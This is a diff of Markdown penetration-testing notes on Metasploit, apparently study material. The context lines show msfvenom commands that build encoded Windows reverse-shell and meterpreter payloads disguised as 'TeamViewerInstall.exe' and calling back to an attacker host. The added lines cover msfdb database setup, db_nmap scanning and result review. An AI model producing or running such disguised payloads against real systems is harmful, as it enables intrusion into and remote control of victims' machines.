@@ -415,12 +415,14 @@ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=<ATTACKER 
 msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=<ATTACKER IP> LPORT=<ATTACKER PORT> -b "\x00" -f perl -e x86/shikata_ga_nai
 ```  
 
-**Generate a payload with the exe format, called TeamViewerInstall.exe**
+**Generate a payload with the exe format, called TeamViewerInstall.exe**  
+
 ```bash
 msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER IP> LPORT=<ATTACKER PORT> -e x86/shikata_ga_nai -f exe -o ./TeamViewerInstall.exe
 ```  
 
-**Generate a payload with the exe format, called TeamViewerInstall.exe running it through multiple iterations**
+**Generate a payload with the exe format, called TeamViewerInstall.exe running it through multiple iterations**  
+
 ```bash
 msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER IP> LPORT=<ATTACKER PORT> -e x86/shikata_ga_nai -f exe -i 10 -o ./TeamViewerInstall.exe
 ```  
@@ -432,7 +434,85 @@ As expected, most anti-virus products that we will encounter in the wild would s
 <details>
 <summary><h3>Databases</h3></summary>
 
-Text
+Databases in msfconsole are used to keep track of your results. Msfconsole has built-in support for the PostgreSQL database system. With it, we have direct, quick, and easy access to scan results with the added ability to import and export results in conjunction with third-party tools.
+
+<details>
+<summary><h4>Setting up the Database</h4></summary>
+
+**PostgreSQL Status**
+
+```bash
+sudo service postgresql status
+```  
+
+**Start PostgreSQL**
+```bash
+sudo systemctl start postgresql
+```  
+
+**Initiate a Database**
+```bash
+sudo apt-get upgrade metasploit-framework
+sudo msfdb init
+```  
+
+**MSF - Database Status**
+
+```bash
+sudo msfdb status
+``` 
+
+**MSF - Connect to the Initiated Database**  
+
+```bash
+sudo msfdb run
+``` 
+
+If, however, we already have the database configured and are not able to change the password to the MSF username, proceed with these commands:
+
+**MSF - Reinitiate the Database**
+
+```bash
+msfdb reinit
+cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/
+sudo service postgresql restart
+msfconsole -q
+``` 
+
+**MSF - msf6 Database Status**
+
+```bash
+msf6 > db_status
+``` 
+
+**MSF - Database Options**  
+
+```bash
+msf6 > help database
+``` 
+
+**MSF - Using Nmap Inside MSFconsole**  
+
+```bash
+msf6 > db_nmap -sV -sS <TARGET IP>
+``` 
+
+**MSF - Review scan results**  
+
+```bash
+msf6 > hosts -h
+msf6 > services -h
+msf6 > creds -h
+msf6 > loot -h
+``` 
+
+**MSF - Database Backup**  
+
+```bash
+msf6 > db_export -f xml backup.xml
+``` 
+
+</details>
 
 </details>
 
